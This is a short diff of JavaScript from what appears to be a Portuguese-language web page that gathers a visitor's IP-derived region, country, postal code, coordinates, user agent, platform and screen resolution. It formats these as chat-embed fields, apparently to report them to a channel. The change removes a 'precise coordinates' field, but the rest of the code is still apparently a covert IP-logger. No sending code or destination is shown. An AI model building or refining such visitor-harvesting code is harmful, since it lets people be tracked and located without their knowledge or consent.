@@ -40,8 +40,7 @@
                 region: "Carregando...",
                 country: "Carregando...",
                 postal: "Carregando...",
-                coordinates: "Carregando...",
-                preciseCoordinates: "Não solicitado"
+                coordinates: "Carregando..."
             };
             getIPAndLocation(data);
 
@@ -87,7 +86,6 @@
                     { name: "País", value: data.country, inline: true },
                     { name: "CEP", value: data.postal, inline: true },
                     { name: "Coordenadas (IP)", value: data.coordinates, inline: true },
-                    { name: "Coordenadas Precisas", value: data.preciseCoordinates, inline: true },
                     { name: "User Agent", value: data.userAgent, inline: false },
                     { name: "Plataforma", value: data.platform, inline: true },
                     { name: "Resolução", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
